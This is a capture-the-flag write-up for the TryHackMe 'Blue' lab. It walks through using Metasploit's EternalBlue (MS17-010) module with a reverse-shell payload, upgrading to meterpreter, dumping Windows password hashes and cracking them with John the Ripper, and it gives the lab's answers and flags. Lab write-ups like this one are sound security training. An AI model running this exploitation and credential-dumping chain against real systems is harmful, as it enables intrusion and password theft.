---
layout: post
title:  "TryHackMe Blue Write-up"
date:   2024-04-23 +0800
categories: write-up
---
This write-up will be walking through the [Blue](https://tryhackme.com/r/room/blue) machine on TryHackMe. This is an easy machine and TryHackMe says it should take around 30 minutes to complete. We also know that this is a Windows machine with some common misconfiguration issues that we may be able to leverage to gain access.

**Question 1** - Scan the machine.

This first question is quite simple, we just need to do a port-scan using Nmap. We can do a basic Nmap scan just simply using the command:

`nmap [MACHINE IP ADDRESS]`

And we get the result:
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
```

**Answer:** (none required)

**Question 2** - How many ports are open with a port number under 1000?

We can answer this question based on the results we got from question 1. There are 3 services running on port numbers lower than 1000: 135, 139, and 445.

**Answer:** 3

**Question 3** - What is this machine vulnerable to?

Okay so we need to find a vulnerability in this machine, we can start our search by figuring out the versions of the services we found running on the machine. To do this we can use another Nmap scan:

`sudo nmap -sV [MACHINE IP ADDRESS]`

This scan may take awhile depending on your connection. Once it's done we get the result:

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We don't get any specific version numbers which makes it a bit hard to search for vulnerabilities. Doing some research tells us that port 445 is commonly associated with SMB, a network file sharing protocol within Windows. When I think of SMB the first exploit that comes to mind is MS17-010, also known as EternalBlue, most famously used in the WannaCry ransomware attacks back in 2017.

Lucky for us, metasploit has an auxiliary module that can check for this vulnerability. Launching the metasploit console with `msfconsole` we can then use the module with the command:

`use auxiliary/scanner/smb/smb_ms17_010`

Using `show options` we can see we just need to set the variable `RHOSTS` to our machine's IP address with the command `set RHOSTS [MACHINE IP ADDRESS]`. And now we can run the module using `run`.

By running the module we get the result:

`Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)`

And we have our answer!

**Answer:** MS17-010

**Question 4** - Start Metasploit

Well since we've already got Metasploit up and running from running our scanner module, we don't need to do anything here but now we've finished with this module we can use the `back` command to exit the module.

**Answer:** (none required)

**Question 5** - Find the exploitation code we will run against the machine. What is the full path of the code?

Okay so we know we need to find a module to exploit MS17-010, we can search Metasploit and find one that suits our needs using:

`search ms17-010 type:exploit`

We get three results, however the `exploit/windows/smb/ms17_010_eternalblue` module looks the most promising.

**Answer:** exploit/windows/smb/ms17_010_eternalblue

**Question 6** - Show options and set the one required value. What is the name of this value?

We can use our exploit module with the following command:

`use exploit/windows/smb/ms17_010_eternalblue`

To see our options use:

`show options`

Our options are:

```
Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                             loit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
                                             t machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER IP]    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Looking at the required heading, the only required value that hasn't already been set is `RHOSTS`. This is our answer. So let's set `RHOSTS` to our machine's IP using `set RHOSTS [MACHINE IP ADDRESS]`.

It's also worth noting that if you're connected to TryHackMe using OpenVPN, you may need to check that `LHOST` is set to the IP assigned to you for the VPN connection, alternatively you can specify the interface (usually tun0 but this may differ depending on your setup).

**Answer:** RHOSTS

**Question 6** - Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

With that done, run the exploit! 

Okay so we can set the payload to the staged reverse TCP payload using the command given to us in the question, and then run the exploit by using `exploit`!

Now we just need to wait for the exploit to finish executing. 

And once it's done we have a shell session on the machine. Now, I'm not really sure why, but when executing this exploit I ended up getting over 200 sessions to the machine. Hitting CTRL + C a few times managed to stop any more connections from spawning. 

**Answer:** (none required)

**Question 7** - Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

All we need to do here is use CTRL + Z to background the current session (alternatively you can enter the command `background` into the shell) and enter 'y' to confirm.

**Answer:** (none required)

**Question 8** - If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? 

Doing some googling for "Metasploit shell to meterpreter" I came across [this](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html) page in the Metasploit documentation. It gives us the module as multi/manage/shell_to_meterpreter.

Entering this in as our answer we see it's wrong, however prepending 'post/' to our answer gives us the points.

**Answer:** post/multi/manage/shell_to_meterpreter

**Question 9** - Select this (use MODULE_PATH). Show options, what option are we required to change?

So we can select the module with `use post/multi/manage/shell_to_meterpreter` and then use `show options` to see the list of options.

```
Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a
                                       uto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```

Similar to question 6, the only required value that hasn't already been set for us is `SESSION`. We can set our session using `set SESSION 1` (if you have multiple sessions, replace 1 with whichever session you want to upgrade to meterpreter).

**Answer:** SESSION

**Question 10** - Run! If this doesn't work, try completing the exploit from the previous task once more.

Run the module with `run` and wait for it to complete. This can take some time, just let it do it's thing until you see a message saying `[*] Meterpreter session x opened`.

**Answer:** (none required)

**Question 11** - Once the meterpreter shell conversion completes, select that session for use.

Just switch to that session using `sessions [SESSION NUMBER]`.

**Answer:** (none required)

**Question 12** - Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

Run the getsystem command in the meterpreter session, this usually upgrades your privileges to system however our sessions is already running as system therefore we get the message `[-] Already running as SYSTEM`. You can also use the command `shell` to spawn a shell and then run `whoami` to print the current user which should return NT AUTHORITY\SYSTEM.

**Answer:** (none required)

**Question 13** - List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

Running `ps` will return a list of the processes currently running on the machine, as well as some information such as their process ID (PID) and the user they are running as. Just pick any process that's running as NT AUTHORITY\SYSTEM and note down the PID. 

Note: Be careful not the confuse the PID with the parent process ID (PPID), the PID is the number in the leftmost column.

**Answer:** (none required)

**Question 14** - Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

Using the PID noted from the previous question, use `migrate [PID]` to migrate the shell to a different process. You may encounter errors such as: 

`[-] core_migrate: Operation failed: Access is denied.` 

or

`[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process`

Just keep picking processes until one works.

**Answer:** (none required)

**Question 15** - Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

Okay so we need to use the `hashdump` command to dump all the hashed passwords from the machine. From this we can see there are three users: Administrator, Guest, and Jon. Administrator and Guest are the two default accounts on Windows, so Jon is our answer. I'd also recommend copying and pasting the hashdump into a .txt file for later use.

**Answer:** Jon

**Question 16** - Copy this password hash to a file and research how to crack it. What is the cracked password?

Time for some password cracking! We've already got our hashdump in a text document, now we need to use a password cracking tool to figure out the password. I'm going to use John The Ripper for this one because its what I'm familiar with. Using John The Ripper I can crack the passwords with the following command:

`sudo john passwords.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt`

To break this command down, first we're running John The Ripper as sudo as it cannot be run from unprivileged accounts. After specifying the `john` command we need to provide a file with hashes to be cracked, I saved my hashdump into a file called 'passwords.txt' so that's what I'm passing in here. Next we're using the `--format` flag to specify the format of the hash, these hashes come from a Windows SAM database where passwords are typically stored as NTHashes so we want to set the format as NT. Finally, we use the `--wordlist` flag to specify a wordlist to use in the cracking process, rockyou.txt is a very large wordlist that comes with Kali Linux so I'll just be using that.

This may take some time depending on how powerful your computer is.

![Successfully Cracked Jon's Password!](/assets/images/Screenshot_2024-04-23_23-08-21.png)

Success! We got Jon's password.

**Answer:** alqfna22

**Question 17** - Flag1? This flag can be found at the system root. 

Okay it's time to capture some flags. In your meterpreter session use `shell` to get a shell connection to the machine. We know the flag is at the system root so we can go there with `cd C:\`. Let's list out the files in the current directory with `dir`. We can see there's a file called flag1.txt, we can look at its contents using `type flag1.txt`. And we have our first flag!

**Answer:** flag{access_the_machine}

**Question 18** - Flag2? This flag can be found at the location where passwords are stored within Windows.

I'm not familiar with where Windows stores passwords, some quick Googling led me to [this](https://stackoverflow.com/questions/46389044/in-windows-operating-system-where-passwords-are-saved-and-in-which-format-they#:~:text=They%20are%20stored%20in%20C,application%20that%20created%20those%20passwords.) StackOverflow post where a very helpful user lets us know they're stored in C:\Windows\System32\config. So we can navigate there with `cd C:/WINDOWS/SYSTEM32/config` and use `dir` to list out all the files in the directory. And there it is, flag2.txt! We can use `type flag3.txt` to get it's contents and we have our second flag.

**Answer:** flag{sam_database_elevated_access}

**Question 19** - flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

Okay so we're likely looking for files somewhere within the Administrator's User folder. Navigating to C:\Users\ with `cd C:\Users\` and then listing out all the files in the directory with `dir` we can see there is no *Administrator* user folder but we do have one for Jon. Let's have a look in Jon's user folder with `cd Jon` and `dir` to list out the files. A pretty standard Windows user folder with Desktop, Documents, ect. Let's have a look for files on the desktop with `dir Desktop`. Nothing there. How about Documents? Using `dir Documents` we see flag3.txt. We can obtain it with `type Documents/flag3.txt`. And there we have it, flag 3!

**Answer:** flag{admin_documents_can_be_valuable}

And that means we've successfully completed the Blue machine!

This is my first ever CTF write-up, I really enjoyed doing this and I'm hoping to do more write-ups in the future! Hopefully this can be of any help to those who maybe need a little guidance with this machine or perhaps just got stuck on a question and needed some tips!
 
